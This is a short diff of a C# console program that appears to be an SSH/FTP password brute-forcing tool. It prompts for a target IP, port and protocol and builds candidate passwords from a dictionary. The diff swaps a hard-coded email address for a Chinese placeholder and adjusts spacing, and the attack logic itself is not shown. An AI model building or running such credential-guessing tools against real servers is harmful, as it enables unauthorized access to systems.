@@ -12,7 +12,7 @@ class Program
 {
     private static int totalAttempts;
     private static int successfulAttempts = 0;
-    private static string emailAddress = "marisapanashe01@gmail.com"; // Your email address
+    private static string emailAddress = "你的电子邮件"; // Your email address ni de dianzi youjian
     private static CancellationTokenSource cts = new CancellationTokenSource(); // Cancellation Token Source
     private static List<string> successfulPasswords = new List<string>(); // List to store successful passwords
 
@@ -32,10 +32,10 @@ class Program
         string ipAddress = Console.ReadLine();
 
         Console.WriteLine("Enter the target port (default SSH port is 22, FTP port is 21):");
-        int port = int.TryParse(Console.ReadLine(), out int userPort) ? userPort : 22;
+        int port = int.TryParse(Console.ReadLine(), out int userPort)? userPort: 22;
 
         Console.WriteLine("Select protocol (1 for SSH, 2 for FTP):");
-        int protocolChoice = int.TryParse(Console.ReadLine(), out int choice) ? choice : 1;
+        int protocolChoice = int.TryParse(Console.ReadLine(), out int choice)? choice: 1;
 
         // Generate potential passwords
         var potentialPasswords = GeneratePotentialPasswords(dictionary);
